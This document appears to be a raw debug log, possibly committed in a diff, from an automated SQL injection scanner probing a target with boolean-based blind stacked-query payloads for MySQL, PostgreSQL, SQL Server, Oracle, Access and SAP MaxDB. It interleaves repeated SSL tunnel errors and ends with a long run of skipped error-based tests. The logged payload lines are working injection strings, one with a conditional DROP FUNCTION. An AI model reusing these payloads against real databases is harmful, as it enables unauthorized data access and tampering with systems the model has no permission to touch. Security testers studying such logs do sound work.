+[08:25:35] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:35] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:35] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:35] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:35] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[08:25:35] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  HAVING 3134=5680-- -
+[08:25:35] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:35] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:35] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:35] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:35] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  HAVING 7225=7225-- -
+[08:25:36] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:36] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:36] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:36] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:36] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
+[08:25:36] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ;SELECT (CASE WHEN (2838=8381) THEN 2838 ELSE 2838*(SELECT 2838 FROM INFORMATION_SCHEMA.PLUGINS) END)-- -
+[08:25:37] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:37] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:37] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:37] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:37] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ;SELECT (CASE WHEN (3864=3864) THEN 3864 ELSE 3864*(SELECT 3864 FROM INFORMATION_SCHEMA.PLUGINS) END)-- -
+[08:25:37] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:37] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:37] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:37] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:37] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
+[08:25:37] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ;SELECT (CASE WHEN (2199=2230) THEN 2199 ELSE 1/(SELECT 0) END)-- -
+[08:25:38] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:38] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:38] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:38] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:38] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ;SELECT (CASE WHEN (2578=2578) THEN 2578 ELSE 1/(SELECT 0) END)-- -
+[08:25:38] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:38] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:38] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:38] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:38] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
+[08:25:38] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ;SELECT * FROM GENERATE_SERIES(5010,5010,CASE WHEN (5010=1657) THEN 1 ELSE 0 END) LIMIT 1-- -
+[08:25:39] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:39] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:39] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:39] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:39] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ;SELECT * FROM GENERATE_SERIES(4434,4434,CASE WHEN (4434=4434) THEN 1 ELSE 0 END) LIMIT 1-- -
+[08:25:39] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:39] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:39] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:39] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:39] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
+[08:25:39] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ;IF(2661=3786) SELECT 2661 ELSE DROP FUNCTION yTMi-- -
+[08:25:40] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:40] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:40] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:40] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:40] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ;IF(6709=6709) SELECT 6709 ELSE DROP FUNCTION mXEH-- -
+[08:25:40] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:40] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:40] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:40] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:40] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
+[08:25:40] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ;SELECT (CASE WHEN (3328=9510) THEN 1 ELSE 3328*(SELECT 3328 UNION ALL SELECT 9510) END)-- -
+[08:25:41] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:41] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:41] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:41] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:41] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ;SELECT (CASE WHEN (8687=8687) THEN 1 ELSE 8687*(SELECT 8687 UNION ALL SELECT 3167) END)-- -
+[08:25:41] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:41] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:41] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:41] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:41] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
+[08:25:41] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ;SELECT (CASE WHEN (5433=6107) THEN 5433 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL-- -
+[08:25:42] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:42] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:42] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:42] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:42] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ;SELECT (CASE WHEN (8600=8600) THEN 8600 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL-- -
+[08:25:43] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:43] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:43] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:43] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:43] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
+[08:25:43] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ;IIF(8508=9498,1,1/0)-- -
+[08:25:43] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:43] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:43] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:43] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:43] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ;IIF(1219=1219,1,1/0)-- -
+[08:25:44] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:44] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:44] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:44] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:44] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
+[08:25:44] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ;SELECT CASE WHEN 6923=3095 THEN 1 ELSE NULL END FROM DUAL-- -
+[08:25:44] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:44] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:44] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:44] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:44] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ;SELECT CASE WHEN 6042=6042 THEN 1 ELSE NULL END FROM DUAL-- -
+[08:25:45] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:45] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:45] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:45] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 8.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UUID_TO_BIN)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 8.0 OR error-based - WHERE or HAVING clause (UUID_TO_BIN)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0 (inline) error-based - Table name clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (XMLType)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (XMLType)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Firebird AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Firebird OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MonetDB AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MonetDB OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Vertica AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Vertica OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'InterSystems Cache AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'InterSystems Cache OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'CUBRID AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'CUBRID OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Virtuoso AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Virtuoso OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'IBM DB2 AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'IBM DB2 OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'ClickHouse OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (getSetting)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'H2 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (CAST)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'H2 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (CAST)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Spanner AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Spanner OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'SQLite >= 3.9 OR error-based - WHERE or HAVING clause (JSON path)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Presto AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (PARSE_DATA_SIZE)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Presto OR error-based - WHERE or HAVING clause (PARSE_DATA_SIZE)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (EXP)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle error-based - Parameter replace' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Firebird error-based - Parameter replace' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'IBM DB2 error-based - Parameter replace' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)' because user specified testing of only boolean-based blind techniques
